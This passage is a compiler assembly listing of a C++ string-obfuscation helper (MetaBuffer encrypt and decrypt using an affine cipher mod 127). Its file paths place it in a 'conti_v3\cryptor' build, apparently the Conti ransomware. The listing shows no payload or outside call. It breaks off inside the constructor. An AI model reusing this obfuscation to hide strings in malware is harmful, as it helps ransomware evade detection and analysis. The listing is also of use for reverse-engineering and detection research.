?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	8d 44 00 59	 lea	 eax, DWORD PTR [rax+rax+89]
  0002e	99		 cdq
  0002f	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00034	f7 f9		 idiv	 ecx
  00036	8b c2		 mov	 eax, edx

; 76   :     }

  00038	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0003f	5f		 pop	 rdi
  00040	5d		 pop	 rbp
  00041	c3		 ret	 0
?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 42	 cmp	 QWORD PTR i$1[rbp], 66	; 00000042H
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ PROC ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv560 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
